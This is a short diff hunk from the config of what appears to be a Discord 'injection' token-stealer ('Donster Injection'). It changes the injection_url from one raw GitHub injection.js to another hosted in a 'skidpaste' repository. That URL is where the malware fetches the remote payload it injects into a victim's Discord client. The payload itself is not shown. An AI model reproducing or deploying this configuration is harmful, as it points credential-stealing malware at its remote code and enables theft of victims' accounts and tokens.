@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Donster Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/xhyv/skidpasteFUVRN3E9UGNE3R49/refs/heads/main/injection.js', 
   /**
    
    **/
